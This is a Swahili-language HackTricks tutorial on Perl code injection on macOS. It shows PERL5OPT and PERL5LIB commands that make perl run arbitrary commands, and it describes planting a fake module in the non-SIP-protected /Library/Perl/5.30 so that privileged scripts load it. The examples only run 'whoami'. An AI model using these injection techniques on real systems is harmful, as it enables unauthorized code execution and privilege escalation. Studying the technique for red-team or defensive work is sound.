# Uingizaji wa Maombi ya Perl kwenye macOS

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kupitia `PERL5OPT` & `PERL5LIB` env variable

Kwa kutumia env variable PERL5OPT inawezekana kufanya perl itekeleze amri za kupindukia.\
Kwa mfano, unda script hii:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Sasa **tuma env variable** na tekeleza skripti ya **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo lingine ni kuunda moduli ya Perl (k.m. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Na kisha tumia mazingira ya env:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Kupitia mahitaji

Inawezekana kuorodhesha folda za mahitaji kwa mpangilio wa Perl unaoendeshwa:
```bash
perl -e 'print join("\n", @INC)'
```
Ambayo itarudisha kitu kama:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorudishwa hazipo, hata hivyo, **`/Library/Perl/5.30`** ipo, haijalindwa na **SIP** na iko **kabla** ya folda zilizolindwa na SIP. Kwa hivyo, mtu anaweza kutumia folda hiyo kuongeza mahitaji ya script ili script ya Perl yenye mamlaka makubwa iweze kuirudisha.

{% hint style="warning" %}
Hata hivyo, kumbuka kwamba **unahitaji kuwa na ruhusa ya msingi kuandika kwenye folda hiyo** na siku hizi utapata **ombi la TCC** hili:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Kwa mfano, ikiwa script inaingiza **`use File::Basename;`** ingewezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya iendeshe nambari ya kupendelea.

## Marejeo

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
